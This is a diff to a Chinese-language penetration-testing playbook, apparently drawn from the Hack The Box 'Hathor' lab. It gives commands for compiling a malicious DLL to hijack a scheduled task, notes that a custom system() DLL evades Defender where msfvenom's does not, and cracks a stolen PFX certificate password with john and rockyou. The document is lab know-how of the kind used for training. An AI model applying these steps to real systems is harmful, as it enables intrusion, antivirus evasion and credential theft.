@@ -80,12 +80,13 @@ BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID lpReserved) {
 ```
 
 ```bash
+sudo apt install -y mingw-w64                                # 缺编译器时先装（Kali 源内；非 root 需 sudo）
 x86_64-w64-mingw32-gcc -shared -O2 -s -o target.dll dll.c    # 位数必须与加载者一致
 file target.dll && ls -l target.dll                          # 自检：PE32+ DLL x86-64；大小应为几 KB
 ```
 
 - **不要用 msfvenom 生成的 DLL**：来源 0xdf HTB-Hathor writeup（2022-11-19）实测 —— msfvenom 出的 DLL 被 Defender 直接删除（文件消失、稍后原件被还原）；本案我们直接走自编 `system()` DLL，**全程未被删除**（§3 探针与后续 ginawild shell 均通过它取得）。
-- 覆盖后**等一个任务周期**，用抓包确认执行：`tcpdump -ni tun0 icmp` 看到 `ping -n 4` 的四个请求即成立（本案实测：四个 ICMP 请求、间隔 1 秒）。
+- 覆盖后**等一个任务周期**，用抓包确认执行：`sudo tcpdump -ni tun0 icmp` 看到 `ping -n 4` 的四个请求即成立（本案实测：四个 ICMP 请求、间隔 1 秒）。
 - 加载中的文件是锁的：写入报错就重试；写入后 `ls` 复核大小，确认没被还原。
 
 **④ 升级为真实动作**：确认执行后，把 DLL 内容换成真实 payload（复制文件、写结果文件、拉起被放行的 exe）。
@@ -107,12 +108,18 @@ file target.dll && ls -l target.dll                          # 自检：PE32+ DL
 **② 破口令**（Kali 无 `crackpkcs12` 包，改用 john）：
 
 ```bash
-apt install -y john                      # john 需带 jumbo 补丁（Kali 自带）；pfx2john.py 依赖 asn1crypto
-python3 -c "import asn1crypto" || python3 -m pip install --user asn1crypto   # 缺依赖时按脚本自身提示装
+sudo apt install -y john                 # john 需带 jumbo 补丁（Kali 自带，pfx 格式可用）
 python3 /usr/share/john/pfx2john.py stolen.pfx > pfx.hash
 john --wordlist=/usr/share/wordlists/rockyou.txt pfx.hash && john --show pfx.hash
 ```
-来源：HTB-Hathor 实测（弱口令，秒出）。依赖依据：`pfx2john.py` 源码在缺 asn1crypto 时会报 `asn1crypto is missing, run 'pip install --user asn1crypto'`。
+```bash
+# 若 pfx2john 报 asn1crypto is missing：Kali 的系统 Python 受 PEP 668 保护，
+# `pip install --user asn1crypto` 会直接报 error: externally-managed-environment
+# —— 按 Kali 官方文档用 venv（或 apt 包 / pipx）：
+python3 -m venv /tmp/vs && /tmp/vs/bin/pip -q install asn1crypto
+/tmp/vs/bin/python /usr/share/john/pfx2john.py stolen.pfx > pfx.hash
+```
+来源：HTB-Hathor 实测（弱口令，秒出）；依赖与 PEP 668 限制的依据：`pfx2john.py` 源码的报错文案 + Kali 官方文档《Python 3 External Packages》。
 
 **③ 重签**（两条路）：
 
